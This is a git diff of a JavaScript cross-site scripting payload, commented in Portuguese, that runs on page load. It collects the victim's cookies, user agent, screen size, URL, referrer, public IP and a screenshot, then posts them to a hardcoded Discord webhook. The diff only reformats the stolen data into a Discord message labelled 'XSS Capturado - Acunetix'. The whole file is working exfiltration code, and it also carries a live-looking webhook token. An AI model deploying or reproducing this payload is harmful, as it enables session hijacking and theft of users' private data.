@@ -1,4 +1,4 @@
-async function lekCaptureAcunetix() {
+async function lekCaptureDiscord() {
   try {
     // Pega cookies
     const cookies = document.cookie || 'No cookies found';
@@ -9,7 +9,7 @@ async function lekCaptureAcunetix() {
     const url = window.location.href;
     const referrer = document.referrer || 'No referrer';
 
-    // Pega IP (com fallback)
+    // Pega IP
     let ip = 'unknown';
     try {
       const ipResponse = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
@@ -33,20 +33,23 @@ async function lekCaptureAcunetix() {
       console.log('Screenshot falhou:', e);
     }
 
-    // Monta payload
+    // Monta payload pro Discord
     const payload = {
-      timestamp: new Date().toISOString(),
-      cookies,
-      userAgent,
-      screenRes,
-      url,
-      referrer,
-      ip,
-      screenshot,
-      source: 'GitHub raw - Acunetix test'
+      content: `**XSS Capturado - Acunetix**\n` +
+               `**Timestamp**: ${new Date().toISOString()}\n` +
+               `**Cookies**: ${cookies}\n` +
+               `**User-Agent**: ${userAgent}\n` +
+               `**Resolução**: ${screenRes}\n` +
+               `**URL**: ${url}\n` +
+               `**Referrer**: ${referrer}\n` +
+               `**IP**: ${ip}\n` +
+               `**Source**: GitHub raw - Acunetix test`,
+      embeds: screenshot !== 'Screenshot not supported' ? [{
+        image: { url: screenshot }
+      }] : []
     };
 
-    // Envia pro webhook
+    // Envia pro webhook do Discord
     try {
       await fetch('https://discord.com/api/webhooks/1395900711295782932/XO_ZAR7d0GTtr6SrVKzqKLCP1o_hXUj0aJUeIu2zT3ROJC80V2_ptFg8q9fVixv61waS', {
         method: 'POST',
@@ -55,7 +58,7 @@ async function lekCaptureAcunetix() {
         mode: 'cors'
       });
     } catch (e) {
-      console.log('Webhook deu zica:', e);
+      console.log('Webhook Discord deu zica:', e);
     }
 
   } catch (e) {
@@ -64,4 +67,4 @@ async function lekCaptureAcunetix() {
 }
 
 // Roda na hora
-lekCaptureAcunetix();
+lekCaptureDiscord();
